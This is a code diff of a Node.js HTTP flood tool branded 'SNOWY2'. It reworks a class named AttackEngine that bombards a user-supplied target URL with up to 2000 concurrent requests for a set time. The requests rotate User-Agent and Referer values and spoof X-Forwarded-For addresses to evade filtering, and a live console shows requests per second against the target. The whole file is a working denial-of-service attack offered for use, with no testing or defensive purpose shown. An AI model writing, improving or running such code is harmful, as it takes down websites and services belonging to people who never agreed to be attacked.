@@ -1,31 +1,42 @@
 const axios = require('axios');
 const fs = require('fs');
 const os = require('os');
+const http = require('http');
+const https = require('https');
 const process = require('process');
+const readline = require('readline');
+const pLimit = require('p-limit').default;
 
-const FIXED_CONCURRENCY = 3000; // Increased concurrency
-const REQUEST_TIMEOUT = 8000; // Reduced timeout
-const THREAD_COUNT = os.cpus().length; // Dynamically set based on available cores
+const MAX_CONCURRENT = Math.min(os.cpus().length * 128, 2000);  // Max concurrency based on CPU threads (8 CPUs -> 128 threads per core)
+const REQUEST_TIMEOUT = 10000;
+const ANIMATION = ['|', '/', '-', '\\'];
 
 const REFERERS = loadLines('refs.txt');
-const USER_AGENTS = loadLines('ua.txt');
+const USER_AGENTS = loadLines('ua.txt');  // Use ua.txt for User-Agent rotation
 
-function loadLines(file) {
+const keepAliveHttp = new http.Agent({ keepAlive: true });
+const keepAliveHttps = new https.Agent({ keepAlive: true });
+
+function loadLines(filename) {
     try {
-        return fs.readFileSync(file, 'utf8')
+        return fs.readFileSync(filename, 'utf8')
             .split('\n')
-            .map(l => l.trim())
+            .map(line => line.trim())
             .filter(Boolean);
     } catch {
         return [];
     }
 }
 
-function randItem(arr, fallback = '') {
-    return arr[Math.floor(Math.random() * arr.length)] || fallback;
+function randomUserAgent() {
+    return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)] || 'Mozilla/5.0';
 }
 
-function randIp() {
+function randomReferer() {
+    return REFERERS[Math.floor(Math.random() * REFERERS.length)] || 'https://google.com';
+}
+
+function randomIp() {
     return Array(4).fill(0).map(() => Math.floor(Math.random() * 255)).join('.');
 }
 
@@ -35,75 +46,73 @@ class AttackEngine {
         this.duration = duration * 1000;
         this.startTime = Date.now();
         this.stats = { total: 0, success: 0, errors: 0, peakRps: 0 };
+        this.limit = pLimit(MAX_CONCURRENT);
     }
 
-    async fireRequest() {
+    async makeRequest() {
         const headers = {
-            'User-Agent': randItem(USER_AGENTS, 'Mozilla/5.0'),
-            'Referer': randItem(REFERERS, 'https://google.com'),
-            'X-Forwarded-For': randIp()
+            'User-Agent': randomUserAgent(),
+            'Referer': randomReferer(),
+            'X-Forwarded-For': randomIp()
         };
 
         try {
-            await axios.get(this.target, {
+            const response = await axios.get(this.target, {
                 headers,
                 timeout: REQUEST_TIMEOUT,
-                maxRedirects: 0,
-                validateStatus: null,
-                decompress: false
+                httpAgent: keepAliveHttp,
+                httpsAgent: keepAliveHttps
             });
-            return true;
+            return response.status === 200 ? 'SUCCESS' : 'ERROR';
         } catch {
-            return false;
+            return 'ERROR';
         }
-    }
-
-    async boosterThread() {
-        while (Date.now() - this.startTime < this.duration) {
-            const results = await Promise.allSettled(
-                Array.from({ length: FIXED_CONCURRENCY }, () => this.fireRequest())
-            );
-            results.forEach(res => {
-                this.stats.total++;
-                if (res.status === 'fulfilled' && res.value) {
-                    this.stats.success++;
-                } else {
-                    this.stats.errors++;
-                }
-            });
-        }
-    }
-
-    async run() {
-        console.log(`\nSNOWY2 - HYPERSONIC MODE`);
-        console.log('='.repeat(60));
-        console.log(`TARGET: ${this.target}`);
-        console.log(`DURATION: ${this.duration / 1000}s`);
-        console.log('='.repeat(60));
-
-        const statTicker = setInterval(() => this.displayStats(), 100);
-        const boosters = Array.from({ length: THREAD_COUNT }, () => this.boosterThread());
-
-        while (Date.now() - this.startTime < this.duration) {
-            await Promise.allSettled(boosters);
-        }
-
-        clearInterval(statTicker);
-        this.printResults();
     }
 
     displayStats() {
         const elapsed = (Date.now() - this.startTime) / 1000;
         const rps = (this.stats.total / elapsed).toFixed(1);
         this.stats.peakRps = Math.max(this.stats.peakRps, parseFloat(rps));
-        process.stdout.write(`\r🔥 RPS: ${rps} | HIT: ${this.stats.success} | ERR: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`);
+        const spin = ANIMATION[this.spinnerIndex++ % ANIMATION.length];
+        process.stdout.write(
+            `\r${spin} ATTACKING | RPS: ${rps} | SUCCESS: ${this.stats.success} | ERRORS: ${this.stats.errors} | TOTAL: ${this.stats.total} | TIME: ${elapsed.toFixed(1)}s`
+        );
     }
 
-    printResults() {
+    async runLoop() {
+        const promises = Array.from({ length: MAX_CONCURRENT }, () =>
+            this.limit(() => this.makeRequest())
+        );
+        const results = await Promise.allSettled(promises);
+        results.forEach(res => {
+            this.stats.total++;
+            if (res.status === 'fulfilled' && res.value === 'SUCCESS') {
+                this.stats.success++;
+            } else {
+                this.stats.errors++;
+            }
+        });
+    }
+
+    async runAttack() {
+        const statInterval = setInterval(() => this.displayStats(), 200);
+
+        while (Date.now() - this.startTime < this.duration) {
+            await this.runLoop(); // Keep running as fast as possible without waiting
+        }
+
+        clearInterval(statInterval);
+        process.stdout.write('\n');
+        this.printSummary();
+    }
+
+    printSummary() {
         const elapsed = (Date.now() - this.startTime) / 1000;
         const avgRps = (this.stats.total / elapsed).toFixed(1);
-        console.log('\n\nATTACK COMPLETED');
+        console.log('\n\nATTACK COMPLETE');
         console.log('='.repeat(60));
+        console.log(`TARGET: ${this.target}`);
+        console.log(`DURATION: ${elapsed.toFixed(1)}s`);
         console.log(`TOTAL REQUESTS: ${this.stats.total}`);
         console.log(`SUCCESS (200): ${this.stats.success}`);
         console.log(`ERRORS: ${this.stats.errors}`);
@@ -113,21 +122,29 @@ class AttackEngine {
     }
 }
 
-// Main execution
+// Main
 (async () => {
-    const readline = require('readline').createInterface({
+    console.log('\nSNOWY2 - T.ME/STSVKINGDOM');
+    console.log('='.repeat(60));
+
+    const rl = readline.createInterface({
         input: process.stdin,
         output: process.stdout
     });
 
-    const ask = q => new Promise(res => readline.question(q, res));
+    const ask = (q) => new Promise(res => rl.question(q, res));
+
     let target = await ask("TARGET: ");
     if (!target.startsWith("http")) target = "http://" + target;
-    const time = parseInt(await ask("TIME (seconds): "));
-    readline.close();
+    const duration = parseInt(await ask("TIME (seconds): "));
+    rl.close();
 
-    if (isNaN(time)) return console.log("Invalid time.");
+    if (isNaN(duration)) return console.log("Invalid time input.");
 
-    const engine = new AttackEngine(target.trim(), time);
-    await engine.run();
+    const engine = new AttackEngine(target.trim(), duration);
+    try {
+        await engine.runAttack();
+    } catch (err) {
+        console.error("Attack failed:", err.message);
+    }
 })();
